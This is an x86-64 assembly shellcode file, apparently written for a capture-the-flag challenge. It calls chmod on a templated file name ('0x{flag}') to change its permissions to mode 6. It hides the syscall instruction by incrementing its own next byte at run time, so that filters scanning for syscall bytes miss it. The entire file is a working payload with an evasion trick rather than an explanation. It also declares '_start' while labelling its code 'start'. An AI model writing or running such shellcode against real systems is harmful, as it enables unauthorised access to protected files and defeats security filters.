.intel_syntax noprefix
.global _start

.section .text
start:
    push 0x{flag}
    push rsp
    pop rdi

    push 6
    pop rsi

    push 0x5a
    pop rax

    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05
